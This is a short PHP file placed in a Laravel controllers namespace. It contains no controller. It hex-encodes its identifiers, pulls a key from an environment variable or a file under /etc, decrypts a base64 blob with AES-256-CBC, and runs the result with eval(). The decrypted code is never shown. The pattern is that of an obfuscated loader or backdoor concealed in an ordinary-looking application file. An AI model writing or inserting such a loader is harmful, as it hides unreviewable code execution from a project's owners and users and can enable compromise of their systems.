<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('gWBYQEAelYnZu9HmRmaBcA==');

$c=base64_decode(

'lwUpty0w228FTCQdUtKfhRZaWyi1Epi6aRdtCJF8gSvGMnJafQgBM3qxkSwgfW2ngiOc7vQPQFpu' .
'gwL89zGM76r6tsNWlD6ZlPuqckrKtEKBimEpjm81MwJf9/T3kHTT02TJp9qtje9Lm8fVr/GylxPY' .
'mWTPReEJi1IofFmoimBoGaj1Bh9ebq0kGXigUaVY3K8gU02naHJ/0rQ7iy2+3cFodJfLBkYdoZJz' .
'eGd5zp13hc3PigZ+2Vo5o2vJDN81'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

